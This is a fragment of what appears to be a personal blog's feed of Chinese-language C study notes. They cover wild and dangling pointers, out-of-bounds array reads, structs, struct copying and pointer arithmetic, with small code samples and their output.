            <link href="https://hung-jia-jun.github.io/技術文件/CVE-2025-55182 漏洞研究/" >
        </entry>
        <entry>
            <title>
                野指針
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/野指針/</id>
            <content type="html">
                &lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818215631.png&quot; alt=&quot;Pasted image 20250818215631.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int *p;
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p);
    return  0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;修改未初始化的指針變數的值&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int *p;
    *p = 10; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p); // 引發: Bus error: 10
    return  0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int num = 11;
    int *p;
    *p = num; // 在沒有初始化指針變數的情況下，修改指針變數的值是錯誤的
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;p); // 引發: Bus error: 10
    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
    return  0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;code-bus-error-10-code&quot; tabindex=&quot;-1&quot;&gt;&lt;code&gt;Bus error: 10&lt;/code&gt;&lt;/h2&gt;
&lt;p&gt;是在 &lt;strong&gt;Unix-like 系統（像 macOS、Linux）&lt;/strong&gt; 上常見的錯誤訊息。代表程式嘗試存取 &lt;strong&gt;無效的記憶體位址&lt;/strong&gt; 或 &lt;strong&gt;不符合對齊規則的記憶體位址&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在 macOS 上特別常見，因為它的記憶體對齊要求比較嚴格。&lt;/p&gt;
&lt;h3 id=&quot;原因&quot; tabindex=&quot;-1&quot;&gt;原因&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;指標錯誤使用&lt;/strong&gt;
&lt;ul&gt;
&lt;li&gt;指標指向無效的記憶體位置（例如已經 &lt;code&gt;free&lt;/code&gt; 過，或是從未正確初始化）。&lt;/li&gt;
&lt;li&gt;指標運算錯誤，導致存取到錯誤位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&quot;指針越界訪問&quot; tabindex=&quot;-1&quot;&gt;指針越界訪問&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818222350.png&quot; alt=&quot;Pasted image 20250818222350.png&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9}; 
    printf(&amp;quot;%d&#92;n&amp;quot;, arr[1]); // 3
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[1]); // 0x16bc9eab4
    printf(&amp;quot;%d&#92;n&amp;quot;, arr[2]); // 5
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[2]); // 0x16bc9eab8
    printf(&amp;quot;%d&#92;n&amp;quot;, arr[99]); // 0 &amp;lt;- 野指針，無法預測這裡的值
    printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;arr[99]); // 0x16bc9ec3c &amp;lt;- 野指針地址，無法預測這裡的值
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;野指針 2:&lt;br /&gt;
以 for loop 方式越界訪問&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9}; 
    for (int i = 0; i &amp;lt; 10; i++){
        printf(&amp;quot;index: %d, value: %d&#92;n&amp;quot;, i, arr[i]);
    }
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2

/* 
output:
index: 0, value: 1
index: 1, value: 3
index: 2, value: 5
index: 3, value: 7
index: 4, value: 9
index: 5, value: 1
index: 6, value: -1657536328
index: 7, value: -1157789503
index: 8, value: 1836167456
index: 9, value: 1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9}; 
    int *p = arr; // 賦值 &amp;amp;arr[0]
    for (int i = 0; i &amp;lt; 10; i++){
        printf(&amp;quot;%d&#92;n&amp;quot;, *p++); // 地址先 +1 個 int 單位(4 個 bytes = 32 bits)
    }
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2
/*
output:
1
3
5
7
9
1
525336608
-509251205
1865920800
1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;訪問已回收的地址&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;// 野指針
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int *test(){
    int a = 15; // 局部變數
    // 返回變數 a 的地址
    return &amp;amp;a;
}

void dummy_function(){
    int x = 999, y = 888, z = 777; // 故意覆蓋 stack
    printf(&amp;quot;dummy function called&#92;n&amp;quot;);
}

int main(){
	// 因為 p2 指向一個可能會被回收掉的地址，所以就產生一個野指針
    int *p2 = test();
    printf(&amp;quot;第一次讀取: %d&#92;n&amp;quot;, *p2);
    
    dummy_function(); // 覆蓋 stack
    
    printf(&amp;quot;第二次讀取: %d&#92;n&amp;quot;, *p2); // 讀到垃圾值
    return 0;
}

// execute: clang PointerTest-3.2.c -o PointerTest-3.2 &amp;amp;&amp;amp; ./PointerTest-3.2

/*
output:
	第一次讀取: 15
	dummy function called
	第二次讀取: 1
*/
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&quot;避免野指針&quot; tabindex=&quot;-1&quot;&gt;避免野指針&lt;/h1&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818231729.png&quot; alt=&quot;Pasted image 20250818231729.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250819212325.png&quot; alt=&quot;Pasted image 20250819212325.png&quot; /&gt;&lt;/p&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/野指針/" >
        </entry>
        <entry>
            <title>
                聲明結構體練習
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/聲明結構體練習/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdlib.h&amp;gt;

/*結構體傳參*/
// 聲明一個結構體
struct Node
{
    int data;
    struct Node *next; // 指向 Node 型變數的指針
};

// 或是如下定義
typedef struct Node1
{
    int data;
    struct Node *next;
}LNode;

// 聲明二叉樹的節點
// 方式 1
struct BTNode
{
    int data;
    struct BTNode *lchild; // 指向左子樹
    struct BTNode *rchild; // 指向右子樹
    
};

// 方式 2
typedef struct BTNode1
{
    int data;
    struct BTNode1 *lchild; // 指向左子樹
    struct BTNode1 *rchild; // 指向右子樹
    
}BTNode1;


// 結構體指針
int main()
{
    // 聲明節點變量的不同方式
    // 方式 1:
    // 聲明單向鍊表的節點
    struct Node node1;
    LNode node2;
    
    // 聲明二叉樹的節點
    struct BTNode btnode1;
    BTNode1 btnode2;
    
    // 方式 2:
    BTNode1 *node5;

    // 動態開闢 BTNode1 大小的空間
    // (BTNode1 *) 強制轉型為 BTNode1 類型
    node5 = (BTNode1 *)malloc(sizeof(BTNode1));
    free(node5); // 釋放 node5 空間
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/聲明結構體練習/" >
        </entry>
        <entry>
            <title>
                結構體訪問 - 課後練習
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體訪問 - 課後練習/</id>
            <content type="html">
                &lt;p&gt;題目:&lt;br /&gt;
輸入班級所有學生的成績，輸出成績高於平均的學生姓名與分數&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#define&quot;&gt;#define&lt;/a&gt; LENGTH 4
// 需求: 輸入班級學生訊息
struct Student
{
    int id;
    char name[20];
    char gender;
    int score;
};

int main()
{
    // 聲明學生的結構體數組
    struct Student student_arr[LENGTH] = {{.id=1, .name=&amp;quot;alice&amp;quot;, .gender=&#39;M&#39;, .score=60},
                                          {.id=2, .name=&amp;quot;bob&amp;quot;, .gender=&#39;F&#39;, .score=65},
                                          {.id=3, .name=&amp;quot;hoho&amp;quot;, .gender=&#39;F&#39;, .score=70},
                                          {.id=4, .name=&amp;quot;doe&amp;quot;, .gender=&#39;M&#39;, .score=80}};
    int score_sum = 0;
    for (int i = 0; i &amp;lt; LENGTH; i++){
        printf(&amp;quot;score: %d&#92;n&amp;quot;, student_arr[i].score);
        score_sum += student_arr[i].score;
    }
    int avg_score = score_sum/LENGTH;
    printf(&amp;quot;avg_score: %d&#92;n&amp;quot;, avg_score);
    for (int i = 0; i &amp;lt; LENGTH; i++){
        if (student_arr[i].score &amp;gt; avg_score){
            printf(&amp;quot;name: %s, score: %d&#92;n&amp;quot;, student_arr[i].name, student_arr[i].score);
        }
    }
}

output: 
	score: 60
	score: 65
	score: 70
	score: 80
	avg_score: 68
	name: hoho, score: 70
	name: doe, score: 80
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體訪問 - 課後練習/" >
        </entry>
        <entry>
            <title>
                結構體複製 - pass by value
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體複製 - pass by value/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

struct Car
{
    char name[30];
    double price;
} a = {.name=&amp;quot;audi AAA&amp;quot;, .price=100};

int main()
{
    // 複製行為
    struct Car  b = a; // 結構體複製是 pass by value
    printf(&amp;quot;a: %p&#92;n&amp;quot;, &amp;amp;a); 
    printf(&amp;quot;b: %p&#92;n&amp;quot;, &amp;amp;b); // 地址不同

    printf(&amp;quot;a =&amp;gt; name: %s, price: %f&#92;n&amp;quot;, a.name, a.price); // 值是一樣
    printf(&amp;quot;b =&amp;gt; name: %s, price: %f&#92;n&amp;quot;, b.name, b.price); // 值是一樣
    
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;結構體的複製是 pass by value&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250830153021.png&quot; alt=&quot;Pasted image 20250830153021.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;printf(&amp;quot;%p&#92;n&amp;quot;, &amp;amp;&lt;a href=&quot;http://a.name/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;a.name&lt;/a&gt;) 輸出的是自己的變數地址&lt;br /&gt;
printf(&amp;quot;%p&#92;n&amp;quot;, &lt;a href=&quot;http://a.name/&quot; target=&quot;_blank&quot; class=&quot;external-link&quot;&gt;a.name&lt;/a&gt;) 輸出指針變數指向的變數地址&lt;/p&gt;
&lt;p&gt;在 C 語言中，字符串屬於常量，只要定義一個字符串 &amp;quot;Hello&amp;quot;, 不管後續誰指向，都是指到同個記憶體位置&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

struct Car
{
    char *name;
    double price;
} a = {.name=&amp;quot;audi AAA&amp;quot;, .price=100};

int main()
{
    // 複製行為
    struct Car  b = a; // 結構體複製是 pass by value，會產生新地址
    printf(&amp;quot;a: %p&#92;n&amp;quot;, &amp;amp;a); 
    printf(&amp;quot;b: %p&#92;n&amp;quot;, &amp;amp;b); // 地址不同

    /*
    結構體本身複製的是值，當值是指針變數時，複製的是該指針變數指向的地址
    */
    printf(&amp;quot;a =&amp;gt; name: %p, price: %p&#92;n&amp;quot;, &amp;amp;a.name, &amp;amp;a.price); // &amp;amp;a.name 顯示指針變數的地址 a =&amp;gt; name: 0x102480000, price: 0x102480008
    printf(&amp;quot;b =&amp;gt; name: %p, price: %p&#92;n&amp;quot;, &amp;amp;b.name, &amp;amp;b.price); // &amp;amp;b.name 顯示指針變數的地址 b =&amp;gt; name: 0x16d986a10, price: 0x16d986a18
    printf(&amp;quot;a =&amp;gt; name: %p, price: %f&#92;n&amp;quot;, a.name, a.price); // a.name 指向的變數地址 a =&amp;gt; name: 0x102478600, price: 100.000000
    printf(&amp;quot;b =&amp;gt; name: %p, price: %f&#92;n&amp;quot;, b.name, b.price); // b.name 指向的變數地址 b =&amp;gt; name: 0x102478600, price: 100.000000
    
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體複製 - pass by value/" >
        </entry>
        <entry>
            <title>
                結構體數組訪問
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體數組訪問/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

struct Person
{
    char name[20];
    int age;
};

int main()
{
    // 1. 創建結構體數組
    struct Person p_arr[5];

    // 2. 如何給結構體數組的元素賦值    
    strcpy(p_arr[0].name, &amp;quot;Jason&amp;quot;);
    p_arr[0].age = 5;
    strcpy(p_arr[1].name, &amp;quot;Jason111&amp;quot;);
    p_arr[0].age = 6;
    strcpy(p_arr[2].name, &amp;quot;Jason222&amp;quot;);
    p_arr[0].age = 7;
    //3. 如何調用數組的元素，即結構體內部的成員

    printf(&amp;quot;p_arr[0].name: %s&#92;n&amp;quot;, p_arr[0].name);
    printf(&amp;quot;p_arr[1].name: %s&#92;n&amp;quot;, p_arr[1].name);
    printf(&amp;quot;p_arr[2].name: %s&#92;n&amp;quot;, p_arr[2].name);

    /*聲明方式 2*/
    // 1. 創建結構體數組
    struct Person p_arr2[]={ {.name=&amp;quot;John&amp;quot;, .age=1},
                            {.name=&amp;quot;John1&amp;quot;, .age=2},
                            {.name=&amp;quot;Joh2&amp;quot;, .age=3}};

    printf(&amp;quot;p_arr2[0].name: %s&#92;n&amp;quot;, p_arr2[0].name);
    printf(&amp;quot;p_arr2[1].name: %s&#92;n&amp;quot;, p_arr2[1].name);
    printf(&amp;quot;p_arr2[2].name: %s&#92;n&amp;quot;, p_arr2[2].name);
    
    /*使用指向數組的指針*/
    struct Person *ptrPerson;
    
    // 取得第 0 個結構體的指針參考
    ptrPerson = &amp;amp;p_arr[0];
    printf(&amp;quot;ptrPerson.name: %s&#92;n&amp;quot;, ptrPerson-&amp;gt;name);
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體數組訪問/" >
        </entry>
        <entry>
            <title>
                結構體指針變數傳遞
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數傳遞/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
/*結構體傳參*/
// 聲明一個結構體
struct Person
{
   char name[20];
   int age;
};

void addAge(struct Person per){
    // 實際傳入的是結構體的副本
    per.age = per.age + 1;
}
void addAge1(struct Person *per){
    // 修改的是指針裡面的值
    per-&amp;gt;age = per-&amp;gt;age + 1;
}

// 結構體指針
int main()
{
    struct Person per1 = {.name=&amp;quot;Tom&amp;quot;, .age=13};
    // 實際傳入的是結構體的副本，pass by value
    addAge(per1);
    printf(&amp;quot;name: %s&#92;n&amp;quot;, per1.name);
    printf(&amp;quot;age: %d&#92;n&amp;quot;, per1.age);

    // 傳入結構體的指針，pass by reference
    addAge1(&amp;amp;per1);
    printf(&amp;quot;name: %s&#92;n&amp;quot;, per1.name);
    printf(&amp;quot;age: %d&#92;n&amp;quot;, per1.age);
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數傳遞/" >
        </entry>
        <entry>
            <title>
                結構體指針變數使用
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數使用/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

// 聲明一個結構體
struct Person
{
   char name[20];
   int age;
};

// 結構體指針
int main()
{
    struct Person per1 = {.name=&amp;quot;Tom&amp;quot;, .age=12};
    struct Person *per_ptr = &amp;amp;per1;

    // 兩者等價
    (*per_ptr).age = 20;
    per_ptr-&amp;gt;age = 30;

    printf(&amp;quot;name: %s&#92;n&amp;quot;, (*per_ptr).name);
    printf(&amp;quot;age: %d&#92;n&amp;quot;, (*per_ptr).age);
    
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針變數使用/" >
        </entry>
        <entry>
            <title>
                結構體指針傳遞練習題 1
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針傳遞練習題 1/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;string.h&amp;gt;
&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
/*結構體傳參*/
// 聲明一個結構體
struct Dog
{
   char name[20];
   int age;
   double weight;
};

// 只能在這邊聲明返回指針
// 陣列在表達式中會自動轉換為指針
char *say(struct Dog dog){
    static char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀
    sprintf(info, &amp;quot;Name: %s, Age: %d, Weight: %.2lf&amp;quot;, dog.name, dog.age, dog.weight);
    return info; //實際是返回陣列的[0] 位置的指針
}

// 方式 2, 指針傳遞
char *say1(struct Dog *dog_ptr){
    static char info[100]; // 需要將局部變量，宣告為 static, 確保在 say 函數運行後，不會銷毀
    (*dog_ptr).age = (*dog_ptr).age + 1;
    sprintf(info, &amp;quot;Name: %s, Age: %d, Weight: %.2lf&amp;quot;, (*dog_ptr).name, (*dog_ptr).age, (*dog_ptr).weight);
    return info; //實際是返回陣列的[0] 位置的指針
}

// 結構體指針
int main()
{
    // 聲明結構體變量，並初始化
    struct Dog myDog;
    strcpy(myDog.name, &amp;quot;大黃&amp;quot;);
    myDog.age = 2;
    myDog.weight = 2.3;

    char *result = say(myDog);
    printf(&amp;quot;info=%s&#92;n&amp;quot;, result);

    char *result2 = say1(&amp;amp;myDog);
    printf(&amp;quot;info=%s&#92;n&amp;quot;, result2);
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/結構體指針傳遞練習題 1/" >
        </entry>
        <entry>
            <title>
                數組反轉操作
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/數組反轉操作/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

int main()
{
    // 一維數組反轉操作
    int arr[] = {0,1,2,3,4,5,6,7,8,9};   
    size_t LENGTH = sizeof(arr) / sizeof(int);
    int tmp = 0;
    // for (int i=0; i &amp;lt; (LENGTH/2); i++)
    // {
    //     tmp = arr[i];
    //     arr[i] = arr[LENGTH-1-i];
    //     arr[LENGTH-1-i] = tmp;
    // }
    
    // 反轉實現方式 2
    for (int left = 0, right = LENGTH-1;left &amp;lt; right;left++, right--)
    {
        int tmp = arr[left];
        arr[left] = arr[right];
        arr[right] = tmp;
    }
    for (int i=0; i &amp;lt; LENGTH; i++)
    {
        printf(&amp;quot;--%d&#92;n&amp;quot;, arr[i]);
    }
    
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/數組反轉操作/" >
        </entry>
        <entry>
            <title>
                指針的自增自減運算
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/指針的自增自減運算/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 2, 3, 4, 5};

    // 以下兩種寫法相等
    // int *p = arr; // 取 arr 首地址存入 pointer p
    int *p = &amp;amp;arr[0]; // &amp;amp; 取地址，並賦值到 *p
    p++; // 使 p 指向下一個元素
    printf(&amp;quot;%d&#92;n&amp;quot;, *p);
    return  0;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818171509.png&quot; alt=&quot;Pasted image 20250818171509.png&quot; /&gt;&lt;br /&gt;
&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250818171526.png&quot; alt=&quot;Pasted image 20250818171526.png&quot; /&gt;&lt;br /&gt;
運算子結合是由右往左結合&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;
int main(){
    int arr[5] = {1, 3, 5, 7, 9};

    // 以下兩種寫法相等
    // int *p = arr; // 取 arr 首地址存入 pointer p
    int *p = &amp;amp;arr[0]; // &amp;amp; 取地址，並賦值到 *p -&amp;gt; 1
    p++; // 使 p 指向下一個元素 -&amp;gt; 3
    printf(&amp;quot;%d&#92;n&amp;quot;, *p); // 3
    printf(&amp;quot;%d&#92;n&amp;quot;, *p++); //取值後輸出，並往後移動 4 個 bit -&amp;gt; 3
    printf(&amp;quot;%d&#92;n&amp;quot;, *p); // 重新取用一次 p 的值 -&amp;gt; 5
    // *++p 運算子是由右往左結合，故等同於 *(++p)
    // ++p 為 7，*++p = 取 p 值 = 7
    printf(&amp;quot;%d&#92;n&amp;quot;, *++p); // 再移動指針增加 4 bit, 並取值 p -&amp;gt; 7
    // ++*p = ++(*p) 取 *p 值並 +1(由右往左結合)
    printf(&amp;quot;%d&#92;n&amp;quot;, ++*p); // 取指針 p 的值(7)，並將該值 + 1 -&amp;gt; 8

    return  0;
}
&lt;/code&gt;&lt;/pre&gt;

            </content>
            <link href="https://hung-jia-jun.github.io/技術文件/C 語言學習/指針的自增自減運算/" >
        </entry>
        <entry>
            <title>
                字符數組
                
            </title>
            <updated>2025-12-22T00:00:00.000Z</updated>
            <id>https://hung-jia-jun.github.io/技術文件/C 語言學習/字符數組/</id>
            <content type="html">
                &lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;&lt;a class=&quot;tag&quot; onclick=&quot;toggleTagSearch(this)&quot; data-content=&quot;#include&quot;&gt;#include&lt;/a&gt; &amp;lt;stdio.h&amp;gt;

int main()
{
    /*
        C 語言裡面沒有 string 的型別，需要以 char array 的方式實現
        所有字符數組必須以 &#92;0 作為結尾
        且字符串末尾的 &#92;0 會佔一個 bytes，計算 length 需注意 n(字符串數量) + 1 
    */
    //字符數組必須以 &#92;0 作為結尾
    char arr[] = {&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;&#92;0&#39;};

    // 標準寫法
    char str1[] = {&#39;h&#39;, &#39;e&#39;, &#39;l&#39;, &#39;l&#39;, &#39;o&#39;, &#39;w&#39;, &#39;&#92;0&#39;};
    
    // 簡化 
    // length = string 數量(11) + &#39;&#92;0&#39;(1) 的數量共 12 個
    char str2[12] = {&amp;quot;hello world&amp;quot;}; // 注意使用雙引號，非單引號

    // 進一步簡化
    char str3[] = {&amp;quot;hello world&amp;quot;};
    char str4[] = &amp;quot;hello world&amp;quot;;

    size_t str_size = sizeof(str4) / sizeof(char);
    printf(&amp;quot;%d&#92;n&amp;quot;, str_size); // 字符串長度 12
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hung-jia-jun.github.io/img/user/images/Pasted%20image%2020250826080229.png&quot; alt=&quot;Pasted image 20250826080229.png&quot; /&gt;&lt;/p&gt;
&lt;p&gt;區分: &#39;&#92;0&#39;, 0, &#39;0&#39;&lt;/p&gt;
